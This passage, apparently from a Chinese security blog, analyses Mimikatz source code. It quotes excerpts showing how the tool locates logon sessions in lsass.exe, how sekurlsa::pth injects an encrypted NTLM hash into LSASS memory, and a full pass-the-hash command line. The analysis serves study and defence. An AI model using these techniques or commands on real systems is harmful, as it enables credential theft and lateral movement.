class="number">0</span>, NULL&#125;, &#123;<span class="number">36</span>,  -<span class="number">6</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1507,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1703,&#123;sizeof(PTRN_WN1703_LogonSessionList),PTRN_WN1703_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1803,&#123;sizeof(PTRN_WN1803_LogonSessionList),PTRN_WN1803_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1903,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2022,&#123;sizeof(PTRN_WN11_LogonSessionList),PTRN_WN11_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">24</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></li><li><p>此时LogonSessionListCount，LogonSessionList两个变量，仅仅表示的是其在内存中的地址。需要通过kull_m_memory_copy获取其值。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="title">securityStruct</span>.hMemory = cLsass.hLsassMem;</div><div class="line"><span class="title">if</span>(securityStruct.address = <span class="type">LogonSessionListCount</span>)       </div><div class="line">kull_m_memory_copy(&amp;<span class="class"><span class="keyword">data</span>, &amp;securityStruct, sizeof(<span class="type">ULONG</span>));   //<span class="keyword">data</span>-&gt;address 保存的是<span class="type">LogonSessionListCount</span>的值</span></div><div class="line"><span class="title">for</span>(i = <span class="number">0</span>; i &lt; nbListes; i++)</div><div class="line">&#123;</div><div class="line">securityStruct.address = &amp;<span class="type">LogonSessionList</span>[i];</div><div class="line"><span class="class"><span class="keyword">data</span>.address = &amp;pStruct;</span></div><div class="line"><span class="class"><span class="keyword">data</span>.hMemory = &amp;<span class="type">KULL_M_MEMORY_GLOBAL_OWN_HANDLE</span>;</span></div><div class="line"><span class="keyword">if</span>(aBuffer.address = <span class="type">LocalAlloc</span>(<span class="type">LPTR</span>, helper-&gt;tailleStruct))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_memory_copy(&amp;<span class="class"><span class="keyword">data</span>, &amp;securityStruct, sizeof(<span class="type">PVOID</span>)))   //securityStruct.address 保存的是<span class="type">LogonSessionList</span>数组地址</span></div><div class="line"> .....</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后第三次调用kull_m_memory_copy()函数，获取双向链表的第一个节点,aBuffer.address就是第一个节点的地址。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;<span class="keyword">data</span>, helper-&gt;</span>tailleStruct))<span class="comment">//aBuffer.address指向的是LogonSessionList双向列表的某个节点</span></div><div class="line">&#123;</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonId= (PLUID)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLuid);</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonType= *((PULONG)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonType));</div><div class="line"><span class="function"><span class="title">sessionData</span>.Session= *((PULONG)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToSession));</div><div class="line"><span class="function"><span class="title">sessionData</span>.UserName= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToUsername);</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonDomain= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToDomain);</div><div class="line"><span class="function"><span class="title">sessionData</span>.pCredentials= *(PVOID *)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToCredentials);</div><div class="line"><span class="function"><span class="title">sessionData</span>.pSid= *(PSID *)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToPSid);</div><div class="line"><span class="function"><span class="title">sessionData</span>.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToCredentialManager);</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonTime= *((PFILETIME)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonTime));</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonServer= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonServer);</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure><p> <img src="http://hacky.wang/blog/20220215/7ozemelppDsx.png?imageslim" alt="mark"></p></li></ul><h2 id="Pass-the-Hash攻击-传递Hash攻击"><a href="#Pass-the-Hash攻击-传递Hash攻击" class="headerlink" title="Pass the Hash攻击(传递Hash攻击)"></a>Pass the Hash攻击(传递Hash攻击)</h2><ul><li><p>哈希传递(pth)攻击是指攻击者可以通过捕获密码的hash值(对应着密码的值),然后简单地将其传递来进行身份验证(攻击者无须通过解密hash值来获取明文密码。)，以此来横向访问其他网络系统。 </p></li><li><p>在Windows中创建密码后，密码经过哈希化处理后存储在安全账户管理器(SAM)，本地安全机构子系统(LSASS)进程内存,凭据管理器(CredManage),Active Directory中的ntds.dit数据库或者其他地方。因此，当用户登录windows工作站或服务器时，他们实际上会留下密码凭据(hash)。</p></li><li><p>但是hash的获取是固定存在的，因为window中经常需要用hash来进行验证和交互。所以利用hash来进行横向移动在内网渗透中经常充当主力的角色。</p></li></ul><h2 id="sekurlsa-pth源码分析"><a href="#sekurlsa-pth源码分析" class="headerlink" title="sekurlsa::pth源码分析"></a>sekurlsa::pth源码分析</h2><ul><li>Mimikatz的sekurlsa::pth命令主要用户进行Pass The Hash攻击，其实现在mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c中的kuhl_m_sekurlsa_pth函数。</li><li>命令如下：<code>sekurlsa::pth /user:Administrator /domain:192.168.230.129 /ntlm:32ed87bdb5fdc5e9cba88547376818d4</code></li><li><p>首先将分别解析命令行所传递的参数，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"luid"</span>, &amp;szLuid, <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line">tokenStats.AuthenticationId.HighPart = <span class="number">0</span>; <span class="comment">// because I never saw it != 0</span></div><div class="line">tokenStats.AuthenticationId.LowPart = wcstoul(szLuid, <span class="literal">NULL</span>, <span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"user"</span>, &amp;szUser, <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"domain"</span>, &amp;szDomain, <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line">isImpersonate = kull_m_string_args_byName(argc, argv, <span class="string">L"impersonate"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">kull_m_string_args_byName(argc, argv, <span class="string">L"run"</span>, &amp;szRun, isImpersonate ? _wpgmptr : <span class="string">L"cmd.exe"</span>);</div><div class="line">kprintf(<span class="string">L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n"</span>, szUser, szDomain, szRun, isImpersonate ? <span class="string">L"yes"</span> : <span class="string">L"no"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(<span class="string">L"Missing argument : domain\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(<span class="string">L"Missing argument : user\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>关于散列，一共可以有4种不同的类型可以选择，分别是aes128，aes256，ntlm，rc4。</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, L<span class="string">"rc4"</span>, &amp;szNTLM, <span class="built_in">NULL</span>) || kull_m_string_args_byName(argc, argv, L<span class="string">"ntlm"</span>, &amp;szNTLM, <span class="built_in">NULL</span>))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))</div><div class="line">&#123;</div><div class="line"><span class="built_in">data</span>.NtlmHash = ntlm;</div><div class="line">kprintf(L<span class="string">"NTLM\t: "</span>); kull_m_string_wprintf_hex(<span class="built_in">data</span>.NtlmHash, LM_NTLM_HASH_LENGTH, <span class="number">0</span>); kprintf(L<span class="string">"\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(L<span class="string">"ntlm hash/rc4 key length must be 32 (16 bytes)\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>接着，调用kull_m_process_create()函数，kull_m_process_create()函数参数主要有</p><ul><li>szRun：需要运行的程序</li><li>szUser：用户名</li><li>szDomain：域</li><li>szPassword：密码(此处密码为空)<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(<span class="name">kull_m_process_create</span>(<span class="name">KULL_M_PROCESS_CREATE_LOGON</span>, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L<span class="string">""</span>, <span class="symbol">&amp;processInfos</span>, FALSE))</div></pre></td></tr></table></figure></li></ul></li><li><p>在kull_m_process_create()函数中，调用CreateProcessWithLogonW()创建一个进程。CreateProcessWithLogonW可以使用指定的凭证信息创建进程。但是传递的Password值是空的，以便后续填充。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="string">case</span> <span class="attr">KULL_M_PROCESS_CREATE_LOGON:</span></div><div class="line"><span class="string">status</span> <span class="string">=</span> <span class="string">CreateProcessWithLogonW(user,</span> <span class="string">domain,</span> <span class="string">password,</span> <span class="string">iLogonFlags,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">dupCommandLine,</span> <span class="string">iProcessFlags,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">&amp;startupInfo,</span> <span class="string">ptrProcessInfos);</span></div><div class="line"><span class="string">break;</span></div><div class="line"><span class="string">&#125;</span></div></pre></td></tr></table></figure></li><li><p>接着调用kuhl_m_sekurlsa_pth_luid()函数，kuhl_m_sekurlsa_pth_luid()携带的参数是一个PSEKURLSA_PTH_DATA结构，其中包含6个成员。LogonId为登录的id，NtlmHash为NTLM散列，也就是常规Pth传入的值。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">typedef struct _SEKURLSA_PTH_DATA &#123; </div><div class="line"><span class="type">PLUID</span><span class="type">LogonId</span>;</div><div class="line"><span class="type">LPBYTE</span><span class="type">NtlmHash</span>;</div><div class="line"><span class="type">LPBYTE</span><span class="type">Aes256Key</span>;</div><div class="line"><span class="type">LPBYTE</span><span class="type">Aes128Key</span>;</div><div class="line"><span class="type">BOOL</span>isReplaceOk;</div><div class="line">&#125; <span class="type">SEKURLSA_PTH_DATA</span>, *<span class="type">PSEKURLSA_PTH_DATA</span>;</div></pre></td></tr></table></figure></li><li><p>kuhl_m_sekurlsa_pth_luid()首先会调用kuhl_m_sekurlsa_acquireLSA()，该函数首先会遍历Lsass.exe进程的模块，根据不同的sekurlsa模块不同的命令，选择不同的模块。例如msv命令就是寻找lsasvr.dll这个模块<br>  <img src="http://hacky.wang/blog/20220217/3PHnIpOeBOLI.png?imageslim" alt="mark"></p></li><li><p>kuhl_m_sekurlsa_acquireLSA()主要调用kull_m_process_getVeryBasicModuleInformations()函数通过PEB的Ldr列表获取指定模块的信息，主要是模块的基地址。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">case KULL_M_MEMORY_TYPE_OWN:</div><div class="line"><span class="keyword">if</span>(kull_m_process_peb(memory, &amp;Peb, FALSE))</div><div class="line">&#123;</div><div class="line"><span class="function"><span class="title">for</span>(pLdrEntry  = (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (Peb.Ldr-&gt;</span>InMemoryOrderModulevector.Flink) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));</div><div class="line">(pLdrEntry != (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (Peb.Ldr) + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector))) &amp;&amp; continueCallback;</div><div class="line"><span class="function"><span class="title">pLdrEntry</span>  = (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (pLdrEntry-&gt;</span>InMemoryOrderLinks.Flink ) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks))</div><div class="line">)</div><div class="line">&#123;</div><div class="line"><span class="function"><span class="title">moduleInformation</span>.DllBase.address = pLdrEntry-&gt;</span>DllBase;</div><div class="line"><span class="function"><span class="title">moduleInformation</span>.SizeOfImage = pLdrEntry-&gt;</span>SizeOfImage;</div><div class="line"><span class="function"><span class="title">moduleInformation</span>.NameDontUseOutsideCallback = &amp;pLdrEntry-&gt;</span>BaseDllName;</div><div class="line">kull_m_process_adjustTimeDateStamp(&amp;moduleInformation);</div><div class="line">continueCallback = callBack(&amp;moduleInformation, pvArg);</div><div class="line">&#125;</div><div class="line">status = STATUS_SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>  <img src="http://hacky.wang/blog/20220217/CXUrtKPGnsJt.png?imageslim" alt="mark"></p></li><li><p>调用kuhl_m_sekurlsa_utils_search()函数搜索LogonSessionList的特征码，LogonSessionList结构体包含了登录会话的诸多信息。其主要会调用kuhl_m_sekurlsa_utils_search_generic()函数。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">KULL_M_PATCH_GENERIC LsaSrvReferences[] = &#123;</div><div class="line">&#123;KULL_M_WIN_BUILD_XP,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>,   <span class="number">0</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2K3,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>, -<span class="number">45</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_VISTA,&#123;sizeof(PTRN_WN60_LogonSessionList),PTRN_WN60_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">21</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_7,&#123;sizeof(PTRN_WN61_LogonSessionList),PTRN_WN61_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">19</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_8,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_BLUE,&#123;sizeof(PTRN_WN63_LogonSessionList),PTRN_WN63_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">36</span>,  -<span class="number">6</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1507,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1703,&#123;sizeof(PTRN_WN1703_LogonSessionList),PTRN_WN1703_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1803,&#123;sizeof(PTRN_WN1803_LogonSessionList),PTRN_WN1803_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1903,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2022,&#123;sizeof(PTRN_WN11_LogonSessionList),PTRN_WN11_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">24</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></li><li><p>首先调用kull_m_patch_getGenericFromBuild()函数，其会根据系统版本选择指定的特征码。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">PKULL_M_PATCH_GENERIC kull_m_patch_getGenericFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, DWORD <span class="keyword">BuildNumber)</span></div><div class="line"><span class="keyword">&#123;</span></div><div class="line"><span class="keyword"></span>SIZE_T i<span class="comment">;</span></div><div class="line">PKULL_M_PATCH_GENERIC current = NULL<span class="comment">;</span></div><div class="line"></div><div class="line">for(i = <span class="number">0</span><span class="comment">; i &lt; cbGenerics; i++)</span></div><div class="line">&#123;</div><div class="line">if(generics[i].MinBuildNumber &lt;= <span class="keyword">BuildNumber)</span></div><div class="line"><span class="keyword"></span>current = &amp;generics[i]<span class="comment">;</span></div><div class="line">else <span class="keyword">break;</span></div><div class="line"><span class="keyword"></span>&#125;</div><div class="line">return current<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后调用kull_m_memory_search搜索指定特征码的地址</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for(<span class="name">CurrentPtr</span> = (<span class="name">PBYTE</span>) Search-&gt;kull_m_memoryRange.kull_m_memoryAdress.address<span class="comment">; !status &amp;&amp; (CurrentPtr + Length &lt;= limite); CurrentPtr++)</span></div><div class="line">status = RtlEqualMemory(<span class="name">Pattern-&gt;address</span>, CurrentPtr, Length)<span class="comment">;</span></div><div class="line">CurrentPtr--<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>调用lsassLocalHelper-&gt;AcquireKeys()函数，本质是调用kuhl_m_sekurlsa_nt6_acquireKeys()函数。其本质和kuhl_m_sekurlsa_utils_search_generic()函数一样，都是先调用kull_m_patch_getGenericFromBuild选择合适的特征码，然后搜索。其目的是为了寻找用于加密凭证的秘钥，因为凭证在内存中加密存储的。其实windows并不是直接比较里面的NTLM散列，而是比较经过加密之后的散列的密文。然后调用利用寻找到的秘钥调用BCryptGenerateSymmetricKey生成秘钥。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = &#123; <span class="comment">// InitializationVector, h3DesKey, hAesKey</span></div><div class="line">&#123;KULL_M_WIN_BUILD_VISTA,&#123;sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),PTRN_WNO8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">63</span>, <span class="number">-69</span>, <span class="number">25</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_7,&#123;sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),PTRN_WNO8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">59</span>, <span class="number">-61</span>, <span class="number">25</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_8,&#123;sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),PTRN_WIN8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">62</span>, <span class="number">-70</span>, <span class="number">23</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1507,&#123;sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),PTRN_WN10_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">61</span>, <span class="number">-73</span>, <span class="number">16</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1809,&#123;sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),PTRN_WN10_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">67</span>, <span class="number">-89</span>, <span class="number">16</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>  <img src="http://hacky.wang/blog/20220217/cIDEWiDFgUuh.png?imageslim" alt="mark"></p></li><li><p>调用kuhl_m_sekurlsa_enum寻找登录凭证，最终调用kuhl_m_sekurlsa_enum_callback_msv_pth函数将加密之后的凭证写入Lsass.exe进程的指定的LogonSessionList数组中。首先比较是否是指定的LogonId。然后调用kuhl_m_sekurlsa_msv_enum_cred()函数</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL</span> CALLBACK kuhl_m_sekurlsa_enum_callback_msv_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)</div><div class="line">&#123;</div><div class="line">PSEKURLSA_PTH_DATA pthData = (PSEKURLSA_PTH_DATA) pOptionalData;</div><div class="line">MSV1_0_PTH_DATA_CRED credData = &#123;pData, pthData&#125;;</div><div class="line"><span class="keyword">if</span>(SecEqualLuid(pData-&gt;LogonId, pthData-&gt;LogonId))</div><div class="line">&#123;</div><div class="line">kuhl_m_sekurlsa_msv_enum_cred(pData-&gt;cLsass, pData-&gt;pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_pth, &amp;credData);</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>最终调用kuhl_m_sekurlsa_msv_enum_cred_callback_pth，在kuhl_m_sekurlsa_msv_enum_cred_callback_pth函数中，首先会调用kuhl_m_sekurlsa_nt6_LsaEncryptMemory函数加密NTLM散列。其加密逻辑是如果加密的凭证能被8整除，则使用AES，否则使用3DES。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">(*<span class="function"><span class="title">pthDataCred</span>-&gt;</span><span class="function"><span class="title">pSecData</span>-&gt;</span><span class="function"><span class="title">lsassLocalHelper</span>-&gt;</span><span class="function"><span class="title">pLsaProtectMemory</span>)(msvCredentials, pCredentials-&gt;</span>Credentials.Length);</div><div class="line">VOID WINAPI kuhl_m_sekurlsa_nt6_LsaProtectMemory(IN PVOID Buffer, IN ULONG BufferSize)</div><div class="line">&#123;</div><div class="line">kuhl_m_sekurlsa_nt6_LsaEncryptMemory((PUCHAR) Buffer, BufferSize, TRUE);</div><div class="line">&#125;</div><div class="line"><span class="comment">//////加密逻辑</span></div><div class="line"><span class="keyword">if</span>(cbMemory % <span class="number">8</span>)</div><div class="line">&#123;</div><div class="line">hKey = &amp;kAes.hKey;</div><div class="line">cbIV = sizeof(InitializationVector);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">hKey = &amp;k3Des.hKey;</div><div class="line">cbIV = sizeof(InitializationVector) / <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line">__try</div><div class="line">&#123;</div><div class="line">status = cryptFunc(*hKey, pMemory, cbMemory, <span class="number">0</span>, LocalInitializationVector, cbIV, pMemory, cbMemory, &amp;cbResult, <span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后调用kull_m_memory_copy函数中的WriteProcessMemory写入Lsass.exe进程空间。最后Resume线程。完事PtH。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">case KULL_M_MEMORY_TYPE_OWN:</div><div class="line"><span class="function"><span class="title">status</span> = WriteProcessMemory(Destination-&gt;</span><span class="function"><span class="title">hMemory</span>-&gt;</span><span class="function"><span class="title">pHandleProcess</span>-&gt;</span><span class="function"><span class="title">hProcess</span>, Destination-&gt;</span><span class="function"><span class="title">address</span>, Source-&gt;</span>address, Length, NULL);</div><div class="line">break;</div></pre></td></tr></table></figure></li></ul><h2 id="NTLM-凭证生成"><a href="#NTLM-凭证生成" class="headerlink" title="NTLM 凭证生成"></a>NTLM 凭证生成</h2><ul><li><code>msv1_0!LsaApLogonUserEx2</code>—&gt;<code>lsasrv!LsapCreateLsaLogonSession</code>—-&gt;<code>msv1_0!SpAcceptCredentials</code></li></ul><h2 id="Kerberos认证协议"><a href="#Kerberos认证协议" class="headerlink" title="Kerberos认证协议"></a>Kerberos认证协议</h2><ul><li><p>Kerberos协议的组成角色：</p><ul><li>客户端：发送请求的一方</li><li>服务端：接收请求的一方</li><li>秘钥分发中心(Key Distribution Center KDC),KDC分为两部分：<ul><li>AS(Authentication Server)：用于认证客服端，以及发放后续客户端用于访问TGS(Ticket Granting Server)的TGT(凭据授予票据Ticket Granting Ticket)</li><li>TGS(Ticket Granting 